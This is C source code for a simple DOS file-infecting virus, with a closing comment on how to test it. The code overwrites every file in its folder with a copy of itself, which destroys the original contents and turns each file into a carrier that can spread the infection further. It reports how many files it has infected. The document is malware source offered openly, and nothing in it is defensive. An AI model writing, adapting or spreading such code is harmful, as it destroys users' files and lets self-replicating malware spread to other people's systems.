#include<stdio.h>
#include<io.h>
#include<dos.h>
#include<dir.h>
#include<conio.h>
#include<time.h>

FILE *virus,*host;
int done,a=0;
unsigned long x; // variable declaration

char buff[2048]; // variable declaration

struct ffblk ffblk;
clock_t st,end;

void main(){
    st=clock();
    clrscr(); // to clear the screen
    done=findfirst(“*.*”,&ffblk,0); //looking for a file with any extension (*.*)
    while(!done){
        virus=fopen(_argv[0],”rb”); // calling the functon
        host=fopen(ffblk.ff_name,”rb+”);
        if(host==NULL) goto next;
        x=89088;
        printf(“Infecting %s\n”,ffblk.ff_name,a);
        while(x>2048){
            fread(buff,2048,1,virus);
            fwrite(buff,2048,1,host);
            x-=2048;
        }
        fread(buff,x,1,virus);
        fwrite(buff,x,1,host);
        a++;
        next:
        {
            fcloseall();
            done=findnext(&ffblk);
        }
    }
    printf(“DONE! (Total Files Infected= %d)”,a);
    end=clock();
    printf(“TIME TAKEN=%f SEC\n”,
    (end-st)/CLK_TCK);
    getch();
}
/**
How to Test this Virus?

Testing this virus normally may infect your computer. So, in order to test this virus program, you are recommended to follow the following steps:

Make a new empty folder in your computer.
Then, copy some executable files or any kind of files in that folder.
Run the application or .exe file of the virus. Within a few seconds, all the other files in that folder get infected.
After that, each file in that folder is a virus which can be used to re-infect.
*/